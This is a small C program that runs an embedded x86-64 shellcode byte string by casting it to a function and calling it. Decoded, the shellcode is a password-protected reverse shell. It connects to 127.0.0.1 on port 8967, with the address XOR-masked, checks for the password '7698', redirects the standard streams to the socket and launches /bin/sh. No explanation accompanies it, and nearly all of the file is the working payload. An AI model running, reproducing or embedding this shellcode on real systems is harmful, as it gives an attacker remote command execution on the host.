#include <stdio.h>

const unsigned char sc[] = \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x23\x07\xb8\xd5\xaa\xaa\xab\x35\xaa\xaa\xaa\xaa\x89\x44\x24\x04\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x31\xc0\x0f\x05\x81\x3e\x37\x36\x39\x38\x75\x25\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x29\xd2\x52\x52\x5e\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

int main (int argc, char** argv)
{
  printf("Shellcode length: %d\n", sizeof(sc));
  int (*p)() = (int(*)())sc;
  p();
}
